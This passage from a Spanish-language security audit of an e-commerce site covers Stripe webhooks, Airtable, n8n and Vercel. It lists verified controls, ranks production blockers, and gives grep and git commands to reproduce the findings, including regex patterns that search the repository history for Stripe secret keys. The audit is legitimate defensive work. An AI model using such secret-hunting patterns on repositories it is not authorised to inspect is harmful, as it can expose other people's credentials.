- **Alertas y conciliación:** aviso por entregas fallidas del webhook, errores de n8n y
  diferencias entre pagos cobrados en Stripe y pedidos presentes en Airtable. Revisar
  periódicamente Workbench → Event deliveries.
- **Copias y restauración:** exportación recuperable de Airtable y del workflow activo de
  n8n, con una prueba de restauración proporcional al tamaño de la tienda.
- **Incidentes:** responsable, canal de aviso y pasos para secreto expuesto, cuenta
  comprometida, pedido cobrado no registrado, duplicado, devolución y disputa.
- **Dominio y despliegue:** comprobar HTTPS, dominio canónico, protección de previews,
  permisos de despliegue y que la rama publicada contiene realmente la tienda nueva.

Hasta obtener esas evidencias, el resultado solo cubre el código y las configuraciones
visibles; no cubre la seguridad completa del servicio en producción.

🔹 **Hay una contradicción documental que debe resolverse.** `00_ESTADO_PROYECTO.md` dice que
el desarrollo está terminado y que solo falta desplegar, mientras este informe identifica
bloqueantes de código y configuración. El archivo de estado es la fuente oficial del proyecto:
antes de autorizar producción debe actualizarse para reflejar los bloqueantes que Ana decida
corregir y los riesgos que acepte expresamente. Este informe no modifica ese archivo.

---

## ✅ Lo que está bien — verificado leyendo el código

No es relleno: si alguien retoca este proyecto, esto es lo que **no** puede romper.

**Pagos**
- La firma del webhook se valida con `constructEventAsync` **sobre el body crudo**
  (`request.text()`, sin parsear antes),
  [api.stripe-webhook.ts:50-59](src/routes/api.stripe-webhook.ts#L50-L59). Firma inválida →
  400 y no se procesa.
- Los importes se recalculan **siempre** desde `src/data/products.ts`. El navegador nunca
  manda un precio.
- El webhook **relee la sesión completa desde la API de Stripe**
  ([:90-94](src/routes/api.stripe-webhook.ts#L90-L94)) en vez de fiarse del payload recibido.
- Un evento no relevante se ignora con 200 (para que Stripe deje de reenviarlo), no con un
  error.
- `GET` al webhook → 405. Solo `POST`.

**Idempotencia de creación** — existe una cabecera de idempotencia en
[checkout.server.ts:121](src/lib/checkout.server.ts#L121), pero **no se incluye entre lo que
está bien** porque cambia en cada ejecución. Ver M6.

**Deduplicación** — las tres barreras están verificadas para reenvíos del **mismo
`event.id`** (ver `00_ESTADO_PROYECTO.md`): caché en memoria, marca persistente en la metadata
del PaymentIntent y `upsert` por `eventId` en Airtable. La marca solo se escribe después de
que n8n confirme, así que un fallo de n8n no pierde ese evento. Esta verificación no cubre
dos Event distintos para la misma sesión y tipo; ver M8.

**Errores** — [src/start.ts:10-23](src/start.ts#L10-L23) convierte cualquier `throw` de una
server function en una página HTML genérica **sin mensaje ni stack**. Los mensajes internos
(«Producto no disponible: X») se quedan en el log del servidor, no llegan al navegador.
[src/server.ts:23-38](src/server.ts#L23-L38) hace lo mismo con los errores que h3 se traga.

**Secretos**
- `.env` **nunca ha estado trackeado**: `git log --all --diff-filter=A -- .env` no devuelve
  nada, y `git rev-list --all --objects` no contiene ningún objeto con esa ruta.
- **Cero valores de secreto en todo el historial.** Buscados patrones reales
  (`sk_live_…`, `sk_test_…`, `whsec_…`, tokens de Airtable, claves de Google) en **todos** los
  commits de **todas** las ramas: ninguna coincidencia. Lo que aparece al buscar «sk_live»
  son menciones del prefijo en `CLAUDE.md` y en los archivos de estado, no claves.
- Hook `pre-commit` con **gitleaks** activo y configurado (`core.hooksPath=.githooks`).
- 🔹 **Cero `VITE_*` y cero `import.meta.env` en todo el repositorio.** No se ha detectado
  una vía directa en el código actual por la que una `sk_`, una `whsec_` o un token de n8n
  o Airtable llegue al bundle del navegador. Todas las claves se leen con `process.env` en
  archivos `.server.ts` o en el handler del webhook.
- El número de tarjeta nunca pasa por código propio: checkout alojado por Stripe.

**Frontend**
- Ningún `dangerouslySetInnerHTML` en código vivo (el único está en código muerto, B3).
- Ningún `innerHTML`, `eval` ni `document.cookie`.
- Ningún dato personal en localStorage: solo el carrito (ids, tallas, cantidades) y el
  consentimiento de cookies.
- `/checkout`, `/pedido/confirmado` y `/pedido/cancelado` llevan `noindex, nofollow` y no
  están en el `sitemap.xml`.
- `/pedido/confirmado` **no lee ni muestra el `session_id`** de la URL: no hay forma de ver
  el pedido de otro cambiando un identificador. Sin embargo, tampoco verifica el pago y
  muestra una confirmación incondicional; ver M9.
- Middleware CSRF activo, y correctamente limitado a las server functions
  (`filter: ctx.handlerType === "serverFn"`), de modo que **no interfiere con el webhook**.

**Datos personales** — la tienda no tiene base de datos propia. Los datos se almacenan en
Stripe y Airtable, pero también son procesados por Vercel y por n8n en Hostinger. No se ha
comprobado si el historial de ejecuciones de n8n conserva los payloads ni durante cuánto
tiempo. En metadata de Stripe se guardan `orderRef`, las notas libres, el opt-in de marketing
y la zona y el CP con los que se cobró. Las notas pueden contener datos identificativos o
sensibles introducidos por el comprador; ver M10. Por tanto, no se afirma que el servidor
«no persiste nada» fuera de Stripe y Airtable hasta verificar logs y ejecuciones.

---

## Bloqueantes para producción

Por orden:

1. **Rate limit persistente o de plataforma en `createCheckoutSession`** (A1). Lo exige el
   propio `CLAUDE.md` §7 y es lo único alto del informe. Un `Map` por instancia no basta como
   control definitivo en serverless.
2. **Idempotencia estable entre reintentos** (M6). La clave actual cambia en cada llamada y
   no cumple el objetivo descrito por el propio proyecto.
3. **Validar que cada sesión recibida pertenece a esta tienda y está en un estado permitido**
   antes de enviarla a n8n (M7).
4. **Deduplicar también por sesión/operación de negocio**, no solo por `event.id`, y probar
   dos Event distintos para la misma sesión y tipo (M8).
5. **`vercel.json` con las cabeceras de seguridad** (M1), desplegando primero la CSP en modo
   `Report-Only`; HSTS sin `preload` hasta verificar dominio y subdominios.
6. **`SITE_URL` definida en Vercel** y obligatoria en el código (M3).
7. **`.max()` y deduplicación en `items`** (M2).
8. **Dar de alta el endpoint del webhook en modo live en Stripe** y poner su `whsec_` nuevo
   en `STRIPE_WEBHOOK_SECRET` de producción. Ya está en `00_ESTADO_PROYECTO.md`; se repite
   aquí porque es el fallo más caro de todos: **la tienda cobraría y ningún pedido llegaría
   a Airtable**.
9. **Limpiar los `overrides` y recuperar `npm run lint`** (M5). Mientras el linter esté
   roto, el proyecto va a ciegas.
10. **Corregir la confirmación incondicional de pago** (M9) y decidir qué pasa con el email
    que la web ya le promete al comprador.
11. **Minimizar y advertir sobre las notas libres** (M10), y comprobar la retención de
    payloads en las ejecuciones de n8n.
12. **Obtener evidencia de los controles operativos esenciales:** MFA y accesos, separación
    de secretos por entorno, alertas de fallos, conciliación de cobros/pedidos, copia
    recuperable e instrucciones mínimas de incidente.

**No bloquean, pero conviene hacerlos pronto:** B1 (prefijo anti-CSV), B3 (borrar
`chart.tsx` y `recharts`), vigilar el riesgo aceptado de `typecast` (B2), la vista de Airtable
que haga visible la columna «Aviso envío» (M4) y la coherencia del banner de cookies.

---

## Cómo reproducir lo que sostiene este informe

```bash
cd 01_PROYECTOS_ACTIVOS/04_ECLIPSSEINORBIT

# Vulnerabilidades y de dónde salen
npm audit
npm ls brace-expansion js-yaml undici

# Ningún secreto puede llegar al navegador
grep -rn "VITE_\|import.meta.env" src/

# Ningún secreto en el historial
git log --all --diff-filter=A -- .env
git grep -I -E "(sk_(live|test)_[A-Za-z0-9]{16,}|whsec_[A-Za-z0-9]{16,})" $(git rev-list --all)

# Ninguna cabecera de seguridad configurada
grep -rniE "content-security-policy|strict-transport|x-frame-options|referrer-policy" \
  --include="*.ts" --include="*.json" --exclude-dir=node_modules .

# La clave de idempotencia nace de un UUID nuevo en cada ejecución
grep -n "randomUUID\|idempotencyKey" src/lib/checkout.server.ts

# La deduplicación actual se apoya en event.id
grep -rn "event.id\|eventId" src/lib/webhook-dedup.server.ts src/routes/api.stripe-webhook.ts

# La validación del webhook no exige hoy una marca propia de origen
grep -n "session.metadata\|session.mode\|session.currency\|session.payment_status" \
  src/routes/api.stripe-webhook.ts

# La página afirma que el pago se recibió sin consultar estado
grep -n "Hemos recibido tu pago\|session_id" src/routes/pedido.confirmado.tsx

# Las notas libres se copian a metadata de Stripe
grep -rn "orderNotes\|notes:" src/routes/checkout.tsx src/lib/checkout.server.ts

# Único sink de XSS, y está muerto
grep -rn "dangerouslySetInnerHTML" src/
grep -rn "ui/chart" src/
```

Los controles operativos no se reproducen con comandos locales: requieren capturas o
comprobaciones directas en los paneles, sin copiar secretos, datos personales ni códigos de
recuperación al informe.
